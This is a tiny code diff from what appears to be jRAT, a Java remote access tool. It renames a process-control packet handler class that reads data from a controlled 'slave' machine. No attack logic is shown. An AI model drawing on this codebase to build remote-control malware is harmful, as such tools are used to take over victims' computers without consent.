@@ -10,7 +10,7 @@ import se.jrat.client.ui.panels.PanelControlRemoteProcess;
 import com.redpois0n.oslib.OperatingSystem;
 
 
-public class Packet20Process extends AbstractIncomingPacket {
+public class Packet25Process extends AbstractIncomingPacket {
 
 	@Override
 	public void read(Slave slave, DataInputStream dis) throws Exception {
